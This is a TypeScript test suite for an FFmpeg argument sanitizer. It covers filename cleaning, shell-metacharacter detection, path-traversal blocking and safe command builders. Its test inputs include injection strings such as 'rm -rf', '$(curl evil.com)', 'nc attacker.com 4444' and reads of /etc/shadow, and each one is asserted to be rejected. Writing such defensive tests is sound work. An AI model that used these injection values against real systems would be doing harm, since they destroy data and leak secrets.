/**
 * FFmpeg Command Sanitizer & Hardening Test Suite
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import * as path from 'node:path';
import * as fs from 'node:fs';
import * as os from 'node:os';
import {
  sanitizeFilename,
  validateSafePath,
  assertNoShellMetachars,
  buildSafeProbeArgs,
  buildSafeTranscodeArgs,
  buildSafeMergeArgs,
  SHELL_METACHARS_REGEX
} from '../src/ffmpeg-sanitizer.ts';

test('FFmpeg Sanitizer - Filename sanitization', () => {
  assert.equal(sanitizeFilename('test_video.mp4'), 'test_video.mp4');
  // Strips directory traversal
  assert.equal(sanitizeFilename('../../etc/passwd'), 'passwd');
  // Replaces unsafe characters
  assert.equal(sanitizeFilename('my video; rm -rf;$(whoami).mp4'), 'my_video__rm_-rf___whoami_.mp4');
  // Prevents hidden dot files
  assert.equal(sanitizeFilename('...hidden_file.mp4'), 'hidden_file.mp4');
  // Empty fallback
  assert.equal(sanitizeFilename(''), 'media_output');
  assert.equal(sanitizeFilename('   '), 'media_output');
});

test('FFmpeg Sanitizer - Shell metacharacter detection', () => {
  assert.equal(SHELL_METACHARS_REGEX.test('safe_file_123.mp4'), false);
  assert.equal(SHELL_METACHARS_REGEX.test('input;cat /etc/shadow'), true);
  assert.equal(SHELL_METACHARS_REGEX.test('`whoami`.mp4'), true);
  assert.equal(SHELL_METACHARS_REGEX.test('$(curl evil.com)'), true);
  assert.equal(SHELL_METACHARS_REGEX.test('video | nc attacker.com 4444'), true);
  assert.equal(SHELL_METACHARS_REGEX.test('video & background'), true);
  assert.equal(SHELL_METACHARS_REGEX.test('video\nnew_cmd'), true);
  assert.equal(SHELL_METACHARS_REGEX.test('video\0nullbyte'), true);

  assert.throws(() => assertNoShellMetachars('unsafe;command', 'param'));
  assert.doesNotThrow(() => assertNoShellMetachars('1920:1080', 'resolution'));
});

test('FFmpeg Sanitizer - Path validation and traversal defense', () => {
  const tmpDir = os.tmpdir();
  const allowedDirs = [tmpDir];

  // Safe path inside tmpDir
  const safePath = path.join(tmpDir, 'muxaro_job_123.mp4');
  const safeCheck = validateSafePath(safePath, allowedDirs);
  assert.equal(safeCheck.isSafe, true);

  // Traversal attack directly with ..
  const rawTraversalCheck = validateSafePath(`${tmpDir}/../etc/passwd`, allowedDirs);
  assert.equal(rawTraversalCheck.isSafe, false);
  assert.match(rawTraversalCheck.error || '', /Directory traversal/);

  // Path outside allowed dirs
  const outCheck = validateSafePath(path.join(tmpDir, '..', 'other.txt'), allowedDirs);
  assert.equal(outCheck.isSafe, false);

  // Out of sandbox path
  const rootCheck = validateSafePath('C:\\Windows\\System32\\cmd.exe', allowedDirs);
  assert.equal(rootCheck.isSafe, false);

  // Null byte injection in path
  const nullCheck = validateSafePath(path.join(tmpDir, 'file.mp4\0.exe'), allowedDirs);
  assert.equal(nullCheck.isSafe, false);
});

test('FFmpeg Sanitizer - Safe FFprobe Argument Builder', () => {
  const tmpDir = os.tmpdir();
  const testInput = path.join(tmpDir, 'test_sample.mp4');
  fs.writeFileSync(testInput, 'mock video stream data');

  try {
    const probeArgs = buildSafeProbeArgs({
      inputPath: testInput,
      allowedBaseDirs: [tmpDir]
    });

    // Check security constraints
    assert.ok(probeArgs.includes('-protocol_whitelist'));
    assert.ok(probeArgs.includes('file,crypto,data'));
    assert.ok(probeArgs.includes('-print_format'));
    assert.ok(probeArgs.includes('json'));
    assert.equal(probeArgs[probeArgs.length - 1], path.resolve(testInput));
  } finally {
    if (fs.existsSync(testInput)) {
      fs.unlinkSync(testInput);
    }
  }
});

test('FFmpeg Sanitizer - Safe Transcode Argument Builder', () => {
  const tmpDir = os.tmpdir();
  const testInput = path.join(tmpDir, 'transcode_in.mp4');
  const testOutput = path.join(tmpDir, 'transcode_out.mp4');
  fs.writeFileSync(testInput, 'sample');

  try {
    const args = buildSafeTranscodeArgs({
      inputPath: testInput,
      outputPath: testOutput,
      allowedBaseDirs: [tmpDir],
      videoCodec: 'libx264',
      audioCodec: 'aac',
      resolution: '1080p',
      crf: 22,
      preset: 'fast',
      audioBitrate: '192k',
      startSeconds: 5,
      durationSeconds: 30
    });

    // Ensure safe flags exist
    assert.ok(args.includes('-nostdin'));
    assert.ok(args.includes('-protocol_whitelist'));
    assert.ok(args.includes('file,crypto,data'));
    assert.ok(args.includes('-c:v'));
    assert.ok(args.includes('libx264'));
    assert.ok(args.includes('-c:a'));
    assert.ok(args.includes('aac'));
    assert.ok(args.includes('-b:a'));
    assert.ok(args.includes('192k'));
    assert.ok(args.includes('-ss'));
    assert.ok(args.includes('5.000'));
    assert.ok(args.includes('-t'));
    assert.ok(args.includes('30.000'));

    // Rejection of invalid codecs
    assert.throws(() => {
      buildSafeTranscodeArgs({
        inputPath: testInput,
        outputPath: testOutput,
        allowedBaseDirs: [tmpDir],
        videoCodec: 'malicious_codec;rm -rf /'
      });
    });

    // Rejection of invalid CRF
    assert.throws(() => {
      buildSafeTranscodeArgs({
        inputPath: testInput,
        outputPath: testOutput,
        allowedBaseDirs: [tmpDir],
        videoCodec: 'libx264',
        crf: 99
      });
    });
  } finally {
    if (fs.existsSync(testInput)) fs.unlinkSync(testInput);
  }
});

test('FFmpeg Sanitizer - Safe Merge Argument Builder', () => {
  const tmpDir = os.tmpdir();
  const vIn = path.join(tmpDir, 'v_in.mp4');
  const aIn = path.join(tmpDir, 'a_in.m4a');
  const out = path.join(tmpDir, 'merged.mp4');

  fs.writeFileSync(vIn, 'video');
  fs.writeFileSync(aIn, 'audio');

  try {
    const args = buildSafeMergeArgs({
      videoInputPath: vIn,
      audioInputPath: aIn,
      outputPath: out,
      allowedBaseDirs: [tmpDir],
      copyStreams: true
    });

    assert.ok(args.includes('-protocol_whitelist'));
    assert.ok(args.includes('-map'));
    assert.ok(args.includes('0:v:0'));
    assert.ok(args.includes('1:a:0'));
    assert.ok(args.includes('-c:v'));
    assert.ok(args.includes('copy'));
    assert.ok(args.includes('-shortest'));
  } finally {
    if (fs.existsSync(vIn)) fs.unlinkSync(vIn);
    if (fs.existsSync(aIn)) fs.unlinkSync(aIn);
  }
});
